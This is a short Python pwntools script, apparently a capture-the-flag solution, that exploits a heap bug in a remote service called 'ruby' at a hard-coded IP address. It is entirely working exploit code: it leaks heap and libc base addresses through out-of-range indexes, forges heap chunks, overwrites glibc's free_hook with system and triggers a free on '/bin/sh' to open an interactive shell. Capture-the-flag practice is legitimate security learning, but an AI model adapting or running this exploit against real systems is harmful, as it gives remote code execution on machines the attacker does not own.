from pwn import *

#r = process("./ruby")
r = remote("192.81.209.60", 2024)
r.recvuntil(b'accessor methods:')


def fwrite(idx, data):
	r.sendline(b'1')
	r.recvuntil(b'Index: ')
	r.sendline(str(idx).encode('utf-8'))
	r.recvuntil(b'Your data: ')
	r.sendline(data)
	r.recvuntil(b'ain)>')

def fread(idx):
	r.sendline(b'2')
	r.recvuntil(b'Index: ')
	r.sendline(str(idx).encode('utf-8'))
	receive = r.recvuntil(b'ain)>')
	return receive


n = 0x7fffffff  
r.sendline(str(n).encode())
r.recvuntil(b'ain)>')



# leak heap base address
fwrite(3, b"\x00") 
receive = fread(3).split(b"\n")[0]
receive = int.from_bytes(receive, "little")
heap_base = receive & 0xfffffffffffff000
#print(hex(heap_base))



# leak libc base address
payload = p64(0) + p64(0x421)
fwrite(999, payload)
for i in range(15):
	fwrite(1000+i, b"\x00")
payload = p64(0)*5 + b'\x51'
fwrite(1016, payload)
fwrite(1017, b"\x00")

big_chunk_address = heap_base + 0x310
fwrite(4, p64(big_chunk_address))
fwrite(155, p64(big_chunk_address))

malloc_hook_off = 0x1ecb70
receive = fread(163).split(b"\n")[0]
receive = int.from_bytes(receive, "little")
libc_base = receive - (malloc_hook_off + 0x10 + 96)
#print(hex(libc_base))



# overwrite free_hook with system
payload = p64(0) + p64(0x291) 
fwrite(5, payload)

chunk290_addr = heap_base + 0x320
payload = p64(chunk290_addr)  # 21 
fwrite(6, payload)
fwrite(21, b'\x00')   # free 1 fake chunk with size of 0x290

free_hook_off = 0x1eee48
fwrite(3, p64(free_hook_off + libc_base) )
fwrite(3, p64(heap_base + 0x10))  # free chunk 0x290 dau tien

fwrite(0, b"/bin/sh\x00")
system_addr = libc_base + 0x52290  # system
fwrite(1, p64(system_addr))


# Delete all
r.sendline(b'3')

r.interactive()
